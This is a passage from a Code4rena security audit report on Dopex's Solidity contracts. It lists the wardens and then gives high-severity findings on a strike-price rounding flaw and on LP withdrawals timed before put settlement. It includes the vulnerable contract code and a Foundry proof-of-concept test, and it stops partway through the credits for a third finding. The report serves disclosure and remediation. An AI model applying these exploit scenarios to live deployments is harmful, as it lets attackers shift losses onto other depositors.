---
sponsor: "Dopex"
slug: "2023-08-dopex"
date: "2023-12-29"
title: "Dopex "
findings: "https://github.com/code-423n4/2023-08-dopex-findings/issues"
contest: 278
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Dopex smart contract system written in Solidity. The audit took place between August 21—September 6 2023.

## Wardens

203 Wardens contributed reports to Dopex:

  1. [said](https://code4rena.com/@said)
  2. [peakbolt](https://code4rena.com/@peakbolt)
  3. [Toshii](https://code4rena.com/@Toshii)
  4. [\_\_141345\_\_](https://code4rena.com/@__141345__)
  5. [LokiThe5th](https://code4rena.com/@LokiThe5th)
  6. [Evo](https://code4rena.com/@Evo)
  7. [deadrxsezzz](https://code4rena.com/@deadrxsezzz)
  8. [volodya](https://code4rena.com/@volodya)
  9. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  10. [0xnev](https://code4rena.com/@0xnev)
  11. [pep7siup](https://code4rena.com/@pep7siup)
  12. [juancito](https://code4rena.com/@juancito)
  13. [kutugu](https://code4rena.com/@kutugu)
  14. [QiuhaoLi](https://code4rena.com/@QiuhaoLi)
  15. [Yanchuan](https://code4rena.com/@Yanchuan)
  16. [catellatech](https://code4rena.com/@catellatech)
  17. [glcanvas](https://code4rena.com/@glcanvas)
  18. [nirlin](https://code4rena.com/@nirlin)
  19. [T1MOH](https://code4rena.com/@T1MOH)
  20. [c3phas](https://code4rena.com/@c3phas)
  21. [RED-LOTUS-REACH](https://code4rena.com/@RED-LOTUS-REACH) ([BlockChomper](https://code4rena.com/@BlockChomper), [DedOhWale](https://code4rena.com/@DedOhWale), [reentrant](https://code4rena.com/@reentrant), and [escrow](https://code4rena.com/@escrow))
  22. [HChang26](https://code4rena.com/@HChang26)
  23. [ladboy233](https://code4rena.com/@ladboy233)
  24. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  25. [dirk\_y](https://code4rena.com/@dirk_y)
  26. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  27. [HHK](https://code4rena.com/@HHK)
  28. [gjaldon](https://code4rena.com/@gjaldon)
  29. [0Kage](https://code4rena.com/@0Kage)
  30. [Tendency](https://code4rena.com/@Tendency)
  31. [Brenzee](https://code4rena.com/@Brenzee)
  32. [Nikki](https://code4rena.com/@Nikki)
  33. [mahdikarimi](https://code4rena.com/@mahdikarimi)
  34. [LowK](https://code4rena.com/@LowK)
  35. [0xMango](https://code4rena.com/@0xMango)
  36. [tapir](https://code4rena.com/@tapir)
  37. [Inspecktor](https://code4rena.com/@Inspecktor)
  38. [ABA](https://code4rena.com/@ABA)
  39. [zzebra83](https://code4rena.com/@zzebra83)
  40. [ak1](https://code4rena.com/@ak1)
  41. [ItsNio](https://code4rena.com/@ItsNio)
  42. [carrotsmuggler](https://code4rena.com/@carrotsmuggler)
  43. [bart1e](https://code4rena.com/@bart1e)
  44. [0x3b](https://code4rena.com/@0x3b)
  45. [wintermute](https://code4rena.com/@wintermute)
  46. [lsaudit](https://code4rena.com/@lsaudit)
  47. [bin2chen](https://code4rena.com/@bin2chen)
  48. [qpzm](https://code4rena.com/@qpzm)
  49. [josephdara](https://code4rena.com/@josephdara)
  50. [sces60107](https://code4rena.com/@sces60107)
  51. [0xvj](https://code4rena.com/@0xvj)
  52. [Udsen](https://code4rena.com/@Udsen)
  53. [rokinot](https://code4rena.com/@rokinot)
  54. [jasonxiale](https://code4rena.com/@jasonxiale)
  55. [chaduke](https://code4rena.com/@chaduke)
  56. [0xCiphky](https://code4rena.com/@0xCiphky)
  57. [ubermensch](https://code4rena.com/@ubermensch)
  58. [Aymen0909](https://code4rena.com/@Aymen0909)
  59. [kodyvim](https://code4rena.com/@kodyvim)
  60. [hals](https://code4rena.com/@hals)
  61. [crunch](https://code4rena.com/@crunch)
  62. [circlelooper](https://code4rena.com/@circlelooper)
  63. [Jiamin](https://code4rena.com/@Jiamin)
  64. [Juntao](https://code4rena.com/@Juntao)
  65. [eeshenggoh](https://code4rena.com/@eeshenggoh)
  66. [Sathish9098](https://code4rena.com/@Sathish9098)
  67. [Inspex](https://code4rena.com/@Inspex) ([DeStinE21](https://code4rena.com/@DeStinE21), [ErbaZZ](https://code4rena.com/@ErbaZZ), [Resistor](https://code4rena.com/@Resistor), [Rugsurely](https://code4rena.com/@Rugsurely), [doggo](https://code4rena.com/@doggo), [jokopoppo](https://code4rena.com/@jokopoppo), [mimic_f](https://code4rena.com/@mimic_f), and [rxnnxchxi](https://code4rena.com/@rxnnxchxi))
  68. [gkrastenov](https://code4rena.com/@gkrastenov)
  69. [Nyx](https://code4rena.com/@Nyx)
  70. [0xWaitress](https://code4rena.com/@0xWaitress)
  71. [wallstreetvilkas](https://code4rena.com/@wallstreetvilkas)
  72. [Bauchibred](https://code4rena.com/@Bauchibred)
  73. [Matin](https://code4rena.com/@Matin)
  74. [niki](https://code4rena.com/@niki)
  75. [flacko](https://code4rena.com/@flacko)
  76. [KrisApostolov](https://code4rena.com/@KrisApostolov)
  77. [0xTiwa](https://code4rena.com/@0xTiwa)
  78. [ArmedGoose](https://code4rena.com/@ArmedGoose)
  79. [oakcobalt](https://code4rena.com/@oakcobalt)
  80. [pontifex](https://code4rena.com/@pontifex)
  81. [0xgrbr](https://code4rena.com/@0xgrbr)
  82. [LeoS](https://code4rena.com/@LeoS)
  83. [Viktor\_Cortess](https://code4rena.com/@Viktor_Cortess)
  84. [nemveer](https://code4rena.com/@nemveer)
  85. [836541](https://code4rena.com/@836541)
  86. [minhtrng](https://code4rena.com/@minhtrng)
  87. [visualbits](https://code4rena.com/@visualbits)
  88. [Qeew](https://code4rena.com/@Qeew)
  89. [0xPsuedoPandit](https://code4rena.com/@0xPsuedoPandit)
  90. [0xmystery](https://code4rena.com/@0xmystery)
  91. [umarkhatab\_465](https://code4rena.com/@umarkhatab_465)
  92. [Cosine](https://code4rena.com/@Cosine)
  93. [Topmark](https://code4rena.com/@Topmark)
  94. [SBSecurity](https://code4rena.com/@SBSecurity) ([Slavcheww](https://code4rena.com/@Slavcheww) and [Blckhv](https://code4rena.com/@Blckhv))
  95. [0xmuxyz](https://code4rena.com/@0xmuxyz)
  96. [ciphermarco](https://code4rena.com/@ciphermarco)
  97. [mark0v](https://code4rena.com/@mark0v)
  98. [bitsurfer](https://code4rena.com/@bitsurfer)
  99. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  100. [rjs](https://code4rena.com/@rjs)
  101. [K42](https://code4rena.com/@K42)
  102. [MohammedRizwan](https://code4rena.com/@MohammedRizwan)
  103. [degensec](https://code4rena.com/@degensec)
  104. [erebus](https://code4rena.com/@erebus)
  105. [mert\_eren](https://code4rena.com/@mert_eren)
  106. [zaevlad](https://code4rena.com/@zaevlad)
  107. [0xWagmi](https://code4rena.com/@0xWagmi)
  108. [ether\_sky](https://code4rena.com/@ether_sky)
  109. [ravikiranweb3](https://code4rena.com/@ravikiranweb3)
  110. [GangsOfBrahmin](https://code4rena.com/@GangsOfBrahmin) ([Satyam_Sharma](https://code4rena.com/@Satyam_Sharma) and [0xweb3boy](https://code4rena.com/@0xweb3boy))
  111. [vangrim](https://code4rena.com/@vangrim)
  112. [Hama](https://code4rena.com/@Hama)
  113. [okolicodes](https://code4rena.com/@okolicodes)
  114. [ginlee](https://code4rena.com/@ginlee)
  115. [WoolCentaur](https://code4rena.com/@WoolCentaur)
  116. [IceBear](https://code4rena.com/@IceBear)
  117. [ayden](https://code4rena.com/@ayden)
  118. [0xkazim](https://code4rena.com/@0xkazim)
  119. [AkshaySrivastav](https://code4rena.com/@AkshaySrivastav)
  120. [KmanOfficial](https://code4rena.com/@KmanOfficial)
  121. [codegpt](https://code4rena.com/@codegpt)
  122. [savi0ur](https://code4rena.com/@savi0ur)
  123. [peanuts](https://code4rena.com/@peanuts)
  124. [piyushshukla](https://code4rena.com/@piyushshukla)
  125. [catwhiskeys](https://code4rena.com/@catwhiskeys)
  126. [mitko1111](https://code4rena.com/@mitko1111)
  127. [0xTheC0der](https://code4rena.com/@0xTheC0der)
  128. [asui](https://code4rena.com/@asui)
  129. [dethera](https://code4rena.com/@dethera)
  130. [klau5](https://code4rena.com/@klau5)
  131. [parsely](https://code4rena.com/@parsely)
  132. [minhquanym](https://code4rena.com/@minhquanym)
  133. [nobody2018](https://code4rena.com/@nobody2018)
  134. [max10afternoon](https://code4rena.com/@max10afternoon)
  135. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  136. [Neon2835](https://code4rena.com/@Neon2835)
  137. [Kow](https://code4rena.com/@Kow)
  138. [0xbranded](https://code4rena.com/@0xbranded)
  139. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  140. [joaovwfreire](https://code4rena.com/@joaovwfreire)
  141. [alexfilippov314](https://code4rena.com/@alexfilippov314)
  142. [0xHelium](https://code4rena.com/@0xHelium)
  143. [ABAIKUNANBAEV](https://code4rena.com/@ABAIKUNANBAEV)
  144. [Vagner](https://code4rena.com/@Vagner)
  145. [etherhood](https://code4rena.com/@etherhood)
  146. [qbs](https://code4rena.com/@qbs)
  147. [alexzoid](https://code4rena.com/@alexzoid)
  148. [mrudenko](https://code4rena.com/@mrudenko)
  149. [tnquanghuy0512](https://code4rena.com/@tnquanghuy0512)
  150. [0xrafaelnicolau](https://code4rena.com/@0xrafaelnicolau)
  151. [Krace](https://code4rena.com/@Krace)
  152. [koo](https://code4rena.com/@koo)
  153. [\_eperezok](https://code4rena.com/@_eperezok)
  154. [ElCid](https://code4rena.com/@ElCid)
  155. [yashar](https://code4rena.com/@yashar)
  156. [0xc0ffEE](https://code4rena.com/@0xc0ffEE)
  157. [Baki](https://code4rena.com/@Baki) ([Viraz](https://code4rena.com/@Viraz) and [supernova](https://code4rena.com/@supernova))
  158. [chainsnake](https://code4rena.com/@chainsnake)
  159. [dimulski](https://code4rena.com/@dimulski)
  160. [0xMosh](https://code4rena.com/@0xMosh)
  161. [halden](https://code4rena.com/@halden)
  162. [mussucal](https://code4rena.com/@mussucal)
  163. [gizzy](https://code4rena.com/@gizzy)
  164. [MiniGlome](https://code4rena.com/@MiniGlome)
  165. [Talfao](https://code4rena.com/@Talfao)
  166. [gumgumzum](https://code4rena.com/@gumgumzum)
  167. [Jorgect](https://code4rena.com/@Jorgect)
  168. [LFGSecurity](https://code4rena.com/@LFGSecurity) ([0xfusion](https://code4rena.com/@0xfusion) and [georgits](https://code4rena.com/@georgits))
  169. [grearlake](https://code4rena.com/@grearlake)
  170. [0x111](https://code4rena.com/@0x111)
  171. [atrixs6](https://code4rena.com/@atrixs6)
  172. [Mike\_Bello90](https://code4rena.com/@Mike_Bello90)
  173. [Anirruth](https://code4rena.com/@Anirruth)
  174. [clash](https://code4rena.com/@clash)
  175. [ge6a](https://code4rena.com/@ge6a)
  176. [Blockian](https://code4rena.com/@Blockian)
  177. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  178. [pks\_](https://code4rena.com/@pks_)
  179. [0xklh](https://code4rena.com/@0xklh)
  180. [blutorque](https://code4rena.com/@blutorque)
  181. [Snow24](https://code4rena.com/@Snow24)
  182. [BugzyVonBuggernaut](https://code4rena.com/@BugzyVonBuggernaut)
  183. [ke1caM](https://code4rena.com/@ke1caM)
  184. [Norah](https://code4rena.com/@Norah)
  185. [auditsea](https://code4rena.com/@auditsea)
  186. [spidy730](https://code4rena.com/@spidy730)
  187. [sl1](https://code4rena.com/@sl1)
  188. [0xsurena](https://code4rena.com/@0xsurena)
  189. [sh1v](https://code4rena.com/@sh1v)

This audit was judged by [Alex the Entreprenerd](https://code4rena.com/@GalloDaSballo).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 26 unique vulnerabilities. Of these vulnerabilities, 9 received a risk rating in the category of HIGH severity and 17 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 52 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 10 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Dopex  repository](https://github.com/code-423n4/2023-08-dopex), and is composed of 9 smart contracts written in the Solidity programming language and includes 2264 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **IllIllI-bot** from warden [IllIllI](https://code4rena.com/@illilli), generated the [Automated Findings report](https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (9)
## [[H-01] Improper precision of strike price calculation can result in broken protocol](https://github.com/code-423n4/2023-08-dopex-findings/issues/2083)
*Submitted by [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2083), also found by [Matin](https://github.com/code-423n4/2023-08-dopex-findings/issues/2014), [Qeew](https://github.com/code-423n4/2023-08-dopex-findings/issues/1844), [visualbits](https://github.com/code-423n4/2023-08-dopex-findings/issues/1606), [crunch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1357), [circlelooper](https://github.com/code-423n4/2023-08-dopex-findings/issues/1330), [qpzm](https://github.com/code-423n4/2023-08-dopex-findings/issues/1206), [Jiamin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1111), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1097), [Juntao](https://github.com/code-423n4/2023-08-dopex-findings/issues/1060), [0xmystery](https://github.com/code-423n4/2023-08-dopex-findings/issues/1005), [eeshenggoh](https://github.com/code-423n4/2023-08-dopex-findings/issues/963), lsaudit ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/812), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/811)), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/746), [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/616), [Cosine](https://github.com/code-423n4/2023-08-dopex-findings/issues/550), [Topmark](https://github.com/code-423n4/2023-08-dopex-findings/issues/546), [0x3b](https://github.com/code-423n4/2023-08-dopex-findings/issues/127), [deadrxsezzz](https://github.com/code-423n4/2023-08-dopex-findings/issues/99), [piyushshukla](https://github.com/code-423n4/2023-08-dopex-findings/issues/913), and [catwhiskeys](https://github.com/code-423n4/2023-08-dopex-findings/issues/102)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1189-L1190> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583>

Due to a lack of adequate precision, the calculated strike price for a PUT option for rDPX is not guaranteed to be 25% OTM, which breaks core assumptions around (1) protecting downside price movement of the rDPX which makes up part of the collateral for dpxETH & (2) not overpaying for PUT option protection.

More specifically, the price of rDPX as used in the `calculateBondCost` function of the RdpxV2Core contract is represented as ETH / rDPX, and is given in 8 decimals of precision. To calculate the strike price which is 25% OTM based on the current price, the logic calls the `roundUp` function on what is effectively 75% of the current spot rDPX price. The issue is with the `roundUp` function of the PerpetualAtlanticVault contract, which effectively imposes a minimum value of 1e6.

Considering approximate recent market prices of `$`2000/ETH and `$`20/rDPX, the current price of rDPX in 8 decimals of precision would be exactly 1e6. Then to calculate the 25% OTM strike price, we would arrive at a strike price of `1e6 * 0.75 = 75e4`. The `roundUp` function will then round up this value to `1e6` as the strike price, and issue the PUT option using that invalid strike price. Obviously this strike price is not 25% OTM, and since its an ITM option, the premium imposed will be significantly higher. Additionally this does not match the implementation as outlined in the docs.

### Proof of Concept

When a user calls the `bond` function of the RdpxV2Core contract, it will calculate the `rdpxRequired` and `wethRequired` required by the user in order to mint a specific `_amount` of dpxETH, which is calculated using the `calculateBondCost` function:

```solidity
function bond(
  uint256 _amount,
  uint256 rdpxBondId,
  address _to
) public returns (uint256 receiptTokenAmount) {
  _whenNotPaused();
  // Validate amount
  _validate(_amount > 0, 4);

  // Compute the bond cost
  (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(
    _amount,
    rdpxBondId
  );
  ...
}
```

Along with the collateral requirements, the `wethRequired` will also include the ETH premium required to mint the PUT option. The amount of premium is calculated based on a strike price which represents 75% of the current price of rDPX (25% OTM PUT option). In the `calculateBondCost` function:

```solidity
function calculateBondCost(
  uint256 _amount,
  uint256 _rdpxBondId
) public view returns (uint256 rdpxRequired, uint256 wethRequired) {
  uint256 rdpxPrice = getRdpxPrice();

  ...

  uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
    .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price

  uint256 timeToExpiry = IPerpetualAtlanticVault(
    addresses.perpetualAtlanticVault
  ).nextFundingPaymentTimestamp() - block.timestamp;
  if (putOptionsRequired) {
    wethRequired += IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)
      .calculatePremium(strike, rdpxRequired, timeToExpiry, 0);
  }
}
```

As shown, the strike price is calculated as:

```solidity
uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).roundUp(rdpxPrice - (rdpxPrice / 4));
```

It uses the `roundUp` function of the PerpetualAtlanticVault contract which is defined as follows:

```solidity
function roundUp(uint256 _strike) public view returns (uint256 strike) {
  uint256 remainder = _strike % roundingPrecision;
  if (remainder == 0) {
    return _strike;
  } else {
    return _strike - remainder + roundingPrecision;
  }
}
```

In this contract `roundingPrecision` is set to `1e6`, and this is where the problem arises. As I mentioned earlier, take the following approximate market prices: `$`2000/ETH and `$`20/rDPX. This means the `rdpxPrice`, which is represented as ETH/rDPX in 8 decimals of precision, will be `1e6`. To calculate the strike price, we get the following: `1e6 * 0.75 = 75e4`. However this value is fed into the `roundUp` function which will convert the `75e4` to `1e6`. This value of `1e6` is then used to calculate the premium, which is completely wrong. Not only is `1e6` not 25% OTM, but it is actually ITM, meaning the premium will be significantly higher than was intended by the protocol design.

### Recommended Mitigation Steps

The value of the `roundingPrecision` is too high considering reasonable market prices of ETH and rDPX. Consider decreasing it.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/2083#issuecomment-1734091528)**

***

## [[H-02] Put settlement can be anticipated and lead to user losses and bonding DoS](https://github.com/code-423n4/2023-08-dopex-findings/issues/1584)
*Submitted by [LokiThe5th](https://github.com/code-423n4/2023-08-dopex-findings/issues/1584), also found by [\_\_141345\_\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/1781), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/738), [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/136), [Nikki](https://github.com/code-423n4/2023-08-dopex-findings/issues/2191), [mahdikarimi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1600), and [wintermute](https://github.com/code-423n4/2023-08-dopex-findings/issues/1814)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175>

The liquidity providers deposit `WETH` into the `PerpetualAtlanticVaultLP` which in turn provides the required collateral for put options writing. Writing puts locks collateral and to write more puts excess collateral is needed. Once a put is *in the money* it can be exercised by the `RdpxCoreV2` contract, which forces the liquidity providers to take on `rdpx` at above market prices (i.e. they take a loss).

The issue is that liquidity providers to the `PerpetualAtlanticVaultLP` can anticipate when they might take losses. Users may then take the precautionary action to avoid losses by exiting the LP prior to put settlements. By doing this, the users who are not as fast, or as technically sophisticated, are forced to take on more losses (as losses are then spread among less LPs).

**Importantly, this is not dependent on MEV and will also happen on chains where MEV is not possible.**

This issue has two root causes:

1.  The price-threshold for settlement is known
2.  `PerpetualAtlanticVaultLP` allows redemptions at any time as long as there is excess collateral available

**This has a second order effect**: by having the ability to anticipate when settlements will happen, if any puts are in the money, there is likely to be redemptions from the `PerpetualAtlanticVaultLP` which will drain all the available collateral. If all the available collateral is drained from the vault, then other users will not be able to bond using the `RdpxV2Core` contracts, as calls to `purchase` will [revert](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281) due to insufficient collateral in the put options vault.

The issue has been classified as high for the following reasons:

1.  The depositors who are either too slow, or are not as technically sophisticated, are forced to take more of the losses related to settlement of put options (as losses are spread among less participants).
2.  The token economic incentive is to anticipate calls to `settle` and avoid taking losses, and `deposit` again thereafter. This *will* create market-related periods of insufficient collateral, leading to regular (albeit temporary) DoS of the bonding mechanism which can impact the `ETH` peg of the `DpxEthToken` (not to mention the poor optics for the project).

### Proof of Concept

As the price-threshold for settlement is known, depositors into the `PerpetualAtlanticVaultLP` have a few options to avoid this loss:

1.  Users can simply monitor the `rdpxPriceInEth` and, once the price is close to the strike price, remove their liquidity through `redeem()`. They can then deposit after settlement to take up a greater number of shares.

2.  Users can monitor the mempool (may be an issue in later versions of Arbitrum or other chains) for calls to `PerpetualAtlanticVault::settle()` and front-run this with a call to `redeem` to avoid losses.

3.  As `settle()` is a manual call from the Dopex multisig, this may take the form of a weekly process. Users may come to anticipate this and pull the available assets from the LP at those regular intervals.

Regardless of the method, the end result is the same.

The below coded PoC demonstrates the issue. One of the users, Bob (`address(1)`), anticipates a call to `settle()` - either through front-running or a market-related decision. Bob then enters and exits the pool right before and after the `settle` call. Dave (`address(2)`), who is another liquidity provider, does not anticipate the `settle()` call. We note the differences in PnL this creates in the console output.

Note: The PoC was created using the `perp-vault/Integration.t.sol` file, and should be placed in the `tests/perp-vault` directory in a `.sol` file. The PoC can then be run with `forge test --match-test testPoCHigh3 -vvv`

Apologies for the extended setup code at the start, this is needed for an accurate test, the PoC start point is marked clearly.

<details>

    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.19;

    import { Test } from "forge-std/Test.sol";
    import "forge-std/console.sol";

    import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
    import { Setup } from "./Setup.t.sol";
    import { PerpetualAtlanticVault } from "contracts/perp-vault/PerpetualAtlanticVault.sol";

    contract PoC is ERC721Holder, Setup {
      // ================================ HELPERS ================================ //
      function mintWeth(uint256 _amount, address _to) public {
        weth.mint(_to, _amount);
      }

      function mintRdpx(uint256 _amount, address _to) public {
        rdpx.mint(_to, _amount);
      }

      function deposit(uint256 _amount, address _from) public {
        vm.startPrank(_from, _from);
        vaultLp.deposit(_amount, _from);
        vm.stopPrank();
      }

      function purchase(uint256 _amount, address _as) public returns (uint256 id) {
        vm.startPrank(_as, _as);
        (, id) = vault.purchase(_amount, _as);
        vm.stopPrank();
      }

      function setApprovals(address _as) public {
        vm.startPrank(_as, _as);
        rdpx.approve(address(vault), type(uint256).max);
        rdpx.approve(address(vaultLp), type(uint256).max);
        weth.approve(address(vault), type(uint256).max);
        weth.approve(address(vaultLp), type(uint256).max);
        vm.stopPrank();
      }

      // ================================ CORE ================================ //

      /**
      Assumptions & config:
        - address(this) is impersonating the rdpxV2Core contract
        - premium per option: 0.05 weth
        - epoch duration: 1 day; 86400 seconds
        - initial price of rdpx: 0.2 weth
        - pricing precision is in 0.1 gwei
        - premium precision is in 0.1 gwei
        - rdpx and weth denomination in wei
      **/

      function testPoCHigh3() external {
        // Setup starts here ----------------------------->
        setApprovals(address(1));
        setApprovals(address(2));
        setApprovals(address(3));

        mintWeth(5 ether, address(1));
        mintWeth(5 ether, address(2));
        mintWeth(25 ether, address(3));

        /// The users deposit
        deposit(5 ether, address(1));
        deposit(5 ether, address(2));
        deposit(25 ether, address(3));

        uint256 userBalance = vaultLp.balanceOf(address(1));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(2));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(3));
        assertEq(userBalance, 25 ether);

        // premium = 100 * 0.05 weth = 5 weth
        uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated

        skip(86500); // expires epoch 1
        vault.updateFunding();
        vault.updateFundingPaymentPointer();
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 0.015 gwei;
        uint256 fundingAccrued = vault.calculateFunding(strikes);
        assertEq(fundingAccrued, 5 ether);
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        /// ---------------- POC STARTS HERE ---------------------------------------------------///
        // At this point the Core contract has purchased options to sell 100 rdpx tokens

        // The market moves against `rdpx` and the puts are now in the money
        priceOracle.updateRdpxPrice(0.010 gwei);

        // Bob, a savvy user, sees there is collateral available to withdraw, and
        // because he monitors the price he knows the vault is about to take a loss
        // thus, he withdraws his capital, expecting a call to settle.
        userBalance = vaultLp.balanceOf(address(1));
        vm.startPrank(address(1));
        vaultLp.redeem(userBalance, address(1), address(1));
        vm.stopPrank();

        vm.startPrank(address(this), address(this));
        (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);
        vm.stopPrank();

        // Bob now re-enters the LP Vault
        vm.startPrank(address(1));
        vaultLp.deposit(weth.balanceOf(address(1)), address(1));
        vm.stopPrank();

        // Now we tally up the scores
        console.log("User Bob ends with (WETH, RDPX, Shares):");
        userBalance = vaultLp.balanceOf(address(1));
        (uint256 aBob, uint256 bBob) = vaultLp.redeemPreview(userBalance);
        console.log(aBob, bBob, userBalance);
        userBalance = vaultLp.balanceOf(address(2));
        (uint256 aDave, uint256 bDave) = vaultLp.redeemPreview(userBalance);
        console.log("User Dave ends with (WETH, RDPX, Shares):");
        console.log(aDave, bDave, userBalance);

        /** 
            Bob and Dave both started with 5 ether deposited into the vault LP.
            Bob ends up with shares worth 4.08 WETH + 16.32 RDPX
            Dave ends up with shares worth 3.48 WETH + 13.94 RDPX
            Thus we can conclude that by anticipating calls to `settle`, 
            either by monitoring the market or through front-running,
            Bob has forced Dave to take on more of the losses.
        */
      }
    }

</details>

The result is that even though Bob and Dave both started with 5 WETH deposited, by anticipating the call to `settle()`, Bob was able to force Dave to take more of the losses while Bob was able to reenter and gain more shares than he started with. He has twisted the knife, so to speak.

*Importantly, because the economic incentive is to exit and enter the pool in this way, it is likely to create a race condition where all the available collateral becomes withdrawn the moment the puts are in the money, meaning no user can bond (as options purchasing will revert [due to this check](https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281)). This leads to temporary DoS of the bonding mechanism, until either the team takes direct action (setting `putsRequired` to `false`) or new deposits come back into the vault*

### Tools Used

Foundry.

### Recommended Mitigation Steps

One option would be to rework the deposits to allow a "cooling off period" after deposits, meaning that assets can't be withdrawn until a set date in the future.

Another option would be to mint more shares to the vault itself in response to calls to `settle()` which accrue to users. These shares can then be distributed to the users as they redeem based on their time in the vault (in effect rewarding the hodlers).

This is not a trivial change, as it will impact the token economics of the project.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/1584#issuecomment-1734037608)**

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/1584#issuecomment-1772839989):**
> I'm understanding that LPs are able to indeed able to redeem up to `totalAvailableCollateral`.
> 
> For this reason, I agree with the validity of the finding.
>
> Conflicted on severity as total loss is capped, however, am thinking High is correct because new depositors are effectively guaranteed a loss, and there seems to be no rational way to avoid this scenario.

***

## [[H-03] The settle feature will be broken if attacker arbitrarily transfer collateral tokens to the PerpetualAtlanticVaultLP](https://github.com/code-423n4/2023-08-dopex-findings/issues/1227)
*Submitted by [klau5](https://github.com/code-423n4/2023-08-dopex-findings/issues/1227), also found by [KrisApostolov](https://github.com/code-423n4/2023-08-dopex-findings/issues/2171), [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2089), [0xc0ffEE](https://github.com/code-423n4/2023-08-dopex-findings/issues/2081), [codegpt](https://github.com/code-423n4/2023-08-dopex-findings/issues/2044), [clash](https://github.com/code-423n4/2023-08-dopex-findings/issues/2017), [ge6a](https://github.com/code-423n4/2023-08-dopex-findings/issues/1966), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1923), [parsely](https://github.com/code-423n4/2023-08-dopex-findings/issues/1888), [Tendency](https://github.com/code-423n4/2023-08-dopex-findings/issues/1881), [wintermute](https://github.com/code-423n4/2023-08-dopex-findings/issues/1817), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1797), [Blockian](https://github.com/code-423n4/2023-08-dopex-findings/issues/1792), [\_\_141345\_\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/1769), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1690), [0xbranded](https://github.com/code-423n4/2023-08-dopex-findings/issues/1632), [visualbits](https://github.com/code-423n4/2023-08-dopex-findings/issues/1610), [Udsen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1596), [0xvj](https://github.com/code-423n4/2023-08-dopex-findings/issues/1590), 